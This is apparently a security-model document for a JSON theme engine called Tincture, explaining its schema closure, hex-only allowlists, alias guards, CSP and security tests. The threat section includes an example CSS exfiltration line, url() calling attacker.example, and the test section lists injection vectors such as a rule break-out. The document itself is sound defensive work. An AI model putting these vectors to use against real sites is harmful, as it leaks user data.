# Security model

A Tincture theme is a JSON file written by someone else. This document is the argument for
why opening one is safe, and an honest list of what is *not* covered.

Read it before loosening anything in `src/theme/schema.ts`. The closure is the feature.

---

## The threat

A theme is a document that arrived from a stranger — pulled from a public repository, pasted
into a textarea, or read back out of `localStorage`. If a theme could carry CSS, it could
carry `url()`, and `url()` is an outbound request. From there:

- `url(https://attacker.example/?c=…)` exfiltrates anything the theme engine can interpolate.
- `@font-face { src: url(…) }` turns a font name into a fetch.
- A `background-image` on a large surface becomes a pixel-ratio fingerprint.
- `expression()` and `javascript:` are historical, but the class of bug is not.

So the design question is not "how do we sanitise CSS?" — it is **"how do we make CSS
unreachable?"** A theme that cannot express a function call cannot express `url()`.

---

## The one rule

> **Themes are data, never code.**

There is no code path that accepts a CSS string from a theme. `src/theme/apply.ts` reads
*typed tokens* and writes CSS custom properties from a fixed list of names. If you find
yourself writing `style={theme.something}` or building a CSS string from theme data, stop —
that is the bug this whole design exists to prevent.

---

## Four independent layers

Each layer is sufficient on its own for the attack it covers. That redundancy is deliberate:
a mistake in one is not a breach.

### 1. Schema — `src/theme/schema.ts`

zod, with `.strict()` on the root, on `tokens`, on each token group, on `effects`, and on
every shadow layer. An unrecognised key is an error, not a silently ignored field.

This is what stops the "add a token, reach the DOM later" attack: `THEME_TOKEN_NAMES` is a
closed list of 16 colour, 9 dimension, 3 font-family and 2 shadow tokens. A theme cannot
introduce a 31st.

Bounded numbers everywhere — `effects.motion` is `0…2`, `blur` is `0…40`, shadow offsets are
`-100…100`. A theme cannot set `1e9` and break layout, and cannot make a number that overflows
into a different CSS value.

### 2. Value allowlist — the same file

Per-type, and narrow on purpose:

| Token | Accepted | Why this shape |
|---|---|---|
| colour | `/^#([0-9a-f]{3}\|[0-9a-f]{6}\|[0-9a-f]{8})$/i` | A hex string cannot contain a parenthesis, so the whole function-injection class is unreachable. Alpha survives via the 8-digit form. |
| dimension | `-?\d+(\.\d+)?` + unit from `px, rem, em, %` | The unit list is closed, so `calc()`, `var()` and `url` cannot pass. Absolute value capped at `10000`. |
| font family | one of `manrope`, `instrument-serif`, `jetbrains-mono`, `fraunces`, `bricolage-grotesque`, `space-grotesk` | A *name*, not a source. All six are bundled under `src/assets/fonts/`; a theme can never point at a remote font. |
| `motif` | one of `none`, `starry-flow`, `terminal-grid`, `hearth`, `neon-rain`, `sakura-tree`, `specimen`, `frost-growth` | A *name*, not an asset and not code. The app owns the renderer and the bytes, so a theme has no way to ship a script or an image. An unrecognised name falls back to `none` instead of throwing. |
| `effects.ambience` / `density` | `0…1` | Bounded like every other number. `ambience: 0` switches a motif off without changing `motif`. |
| `effects.scale` | `0.2…3` | Geometry, bounded, so a motif cannot be scaled into a layout-breaking size. |
| `effects.seed` | integer `0…999999` | Seeds the deterministic motifs. An integer, so a theme cannot smuggle a float through and make a motif differ between loads. |
| shadow | an object `{x, y, blur, spread, color}`, or 1–4 of them | Structured numbers. A shadow is never a CSS string. |
| `appearance` | `light` \| `dark` | Drives `color-scheme`; an enum, not free text. |
| `id` | `^[a-z0-9]+(-[a-z0-9]+)*$`, 2–48 chars | Safe as a `data-` attribute and a filename. |
| `date`, `version` | `YYYY-MM-DD`, semver | Sorted and displayed; keeping them shaped prevents render surprises. |

**Hex-only is a deliberate cost.** No `rgb()`, no `hsl()`, no `oklch()`, no `color-mix()`.
Authors lose some expressiveness; the engine gains a property that no colour value can be a
function call. If you ever want `oklch()` back, you are proposing to accept function calls —
bring a parser, not a regex.

### 3. Alias resolution — `src/theme/validate.ts`

Aliases (`{color.accent}`) make semantic themes possible: a surface can point at a base
colour rather than repeating a hex. Two guards keep that from becoming a denial of service:

- **Cycle detection.** A `visited` set walks the chain; `a → b → a` fails with the chain
  spelled out in the message rather than hanging.
- **Depth cap of 8.** A chain longer than that is a mistake even when it terminates, and the
  cap means a pathological document cannot burn a long task.

Resolved values are then **re-checked against the type their token name promises**. An alias
is not a way to smuggle a value past the type system: a dimension that resolves to a colour is
reported as `Must resolve to a hex colour. It currently resolves to …`.

`parseTheme` returns a `Result` and never throws. A malformed theme is an expected input, not
an exception — it arrives from `localStorage`, a URL, or a downloaded file.

### 4. CSP — `index.html` and `vercel.json`

```
default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline';
img-src 'self' data:; font-src 'self';
connect-src 'self' https://api.github.com https://raw.githubusercontent.com;
object-src 'none'; base-uri 'none'; form-action 'none'; frame-src 'none';
frame-ancestors 'none'; upgrade-insecure-requests
```

The same policy is written in two places: a `<meta http-equiv>` in `index.html` and a real
header in `vercel.json`. The two had drifted — `index.html` was missing `frame-ancestors`
and `upgrade-insecure-requests`, and `vercel.json` was missing `frame-src` — so the policy
in force in production was not the one the source described. They are now identical except
for one directive: **`frame-ancestors` is ignored in a `<meta>` tag**, so it appears only in
the header, where `X-Frame-Options: DENY` covers the same ground for older browsers.

The layer under everything else. Even if a value escaped layer 2, there is no origin for it to
call: `default-src 'self'` means an unexpected fetch fails at the browser, not at the schema.

`connect-src` is the one deliberate opening, limited to GitHub, because the community gallery
reads themes from the public repository. `raw.githubusercontent.com` is there for the
`download_url` the contents API returns.

---

## What a theme cannot do

Not "is unlikely to" — cannot, because no field exists that could hold it:

- No `url()`, `@import`, `@font-face`, `expression()`, `javascript:`.
- No selectors. A theme cannot target `.btn` or `body`; it sets tokens, and the app decides
  which properties those tokens feed.
- No remote origin of any kind.
- No HTML. Theme strings reach CSS custom properties only — never `innerHTML`, and there is
  no `dangerouslySetInnerHTML` anywhere near theme data.
- No new token names.
- No hanging the app via a reference chain.

---

## The other untrusted inputs

The theme is not the only one. Three more, all treated the same way:

**`localStorage`.** User-writable, therefore untrusted. It goes through `parseTheme` on every
read, exactly like a downloaded file. A theme edited in DevTools is rejected on the same
grounds as one fetched from GitHub.

**The gallery cache.** Same argument — `tincture.gallery.v1` is `localStorage`, so it is
re-validated on read. The cache is not a trust boundary.

**Fetched themes.** A theme merged into the repository is trusted by that repository's CI, not
by this app. The app re-runs the full validator anyway, because the app is what paints it.
Downloads are also size-capped at 256 KB *before* parsing, so a hostile file does not get to
be parsed. Nothing is applied automatically: downloading adds a theme to the list, and
applying it is a separate, explicit click.

---

## What is *not* covered

Written down so nobody assumes otherwise.

- **`style-src 'unsafe-inline'`.** Required: React writes inline styles, and the theme engine
  sets custom properties on elements. The cost is real — an HTML-injection bug elsewhere in
  the app could set styles. It cannot exfiltrate, because `default-src 'self'` still blocks
  the request. Removing it means moving every dynamic style into a stylesheet, which would
  mean building CSS strings from theme data — the thing this design forbids. Accepted.
- **GitHub's unauthenticated rate limit.** The gallery uses the public API without a token:
  60 requests per hour per IP. On a shared connection a user can be rate-limited by other
  people's traffic. Handled with a message, not a workaround; a token would have to live in
  the client, which is worse.
- **A compromised repository.** If an attacker can merge to `themes/` *and* the validator has
  a hole, the app is exposed. This is why the app re-validates rather than trusting CI.
- **The browser and the OS.** A malicious extension, a compromised browser, or a modified
  build is outside the model. Client-side code cannot defend against its own host.
- **The `$schema` field.** Accepted as a free string for editor tooling. It is metadata, it is
  never fetched, and it never reaches CSS.
- **`looksLikeInjection()`** is a *diagnostic*, not a control. It exists so the builder can
  explain why a value was rejected. The schema is what rejects it.
- **The motif renderers are code, not data.** They read only validated numbers and the
  theme's own colour tokens, and the single bundled image is app-owned and same-origin — but
  a renderer is still code, so a bug in one (an unbounded loop, a pathological seed) is a
  denial of service against the user's own machine, not a breach of the theme boundary. The
  mitigation is bounds rather than sandboxing: every parameter a motif reads is range-checked
  by the schema, `seed` is an integer, `density` is *mapped* onto a per-motif element count
  rather than used as one, and `ambience: 0` stops a motif entirely. The canvas is also
  capped at `2×` device pixels, so a 3× display cannot quadruple the fill rate.

---

## Checking a change

```bash
npm run verify   # build + the full test suite
npm test         # theme.test.ts is the security suite
```

`src/theme/theme.test.ts` holds the attacks, each written as a theme that is valid except for
one field:

- **Value allowlist** — `url()` in a colour, a rule break-out (`#fff; background: url(…)`),
  `url()` hidden behind a valid-looking prefix, `@import` in a colour slot, `calc()` and
  `var()` in a dimension, a remote font, an unbundled font, `expression()`, an HTML tag, and a
  CSS escape sequence smuggling a keyword.
- **Closure** — an unknown token name, an unknown top-level key, an unknown key inside
  `effects`, an out-of-range number, a shadow carrying a string where a number belongs, a
  malformed `id`.
- **Aliases** — a direct cycle, an indirect cycle, a reference to a token that does not exist,
  and a cross-type reference (a dimension pointing at a colour).
- **Emission** — that no built-in theme produces a `url()`, and that every declaration in the
  generated CSS matches the value grammar.

**Known gap:** the alias depth cap (`MAX_ALIAS_DEPTH`) is implemented but has no test — the
cycle cases cover termination, not the cap. Worth a case if you touch `resolveAlias`.

Add a case for anything you change here. A control without a test is a comment.

`src/theme/community.test.ts` is the merge gate: it validates every file in `themes/`, checks
the filename matches the `id`, requires every token to be defined, and refuses any value that
resembles CSS. That is the check that runs on a pull request.
